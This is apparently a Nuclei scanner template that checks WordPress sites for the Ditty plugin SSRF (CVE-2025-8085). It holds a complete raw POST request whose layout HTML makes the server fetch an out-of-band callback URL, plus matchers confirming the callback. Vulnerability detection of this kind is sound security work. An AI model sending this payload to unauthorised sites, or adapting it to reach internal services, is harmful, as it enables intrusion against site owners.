id: wordpress_ditty_cve_2025_8085_ssrf

info:
  name: WordPress Ditty CVE-2025-8085 SSRF
  author: iSee857
  severity: high
  description: |
    wordpress_ditty_cve_2025_8085_ssrf
  metadata:
    verified: true
    max-request: 1

variables:
  marker_item_id: "{{rand_text_alpha(5)}}"
  marker_item: "{{rand_int(1000, 9999)}}"

http:
  - raw:
      - |
        POST /wp-json/dittyeditor/v1/displayItems HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {
          "apiData": {
            "layouts": [
              {
                "id": "{{marker_item}}",
                "html": "{image default_src=\"http://{{interactsh-url}}\"}",
                "css": "{{marker_item}}"
              }
            ],
            "items": [
              {
                "item_id": "{{marker_item_id}}",
                "item_type": "default",
                "item_value": { "content": "{{marker_item}}" },
                "layout_value": { "default": "{{marker_item}}" }
              }
            ]
          }
        }

    redirects: true
    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"

      - type: status
        status:
          - 200

      - type: word
        words:
          - "{{marker_item_id}}"
          - "{{marker_item}}"
        condition: and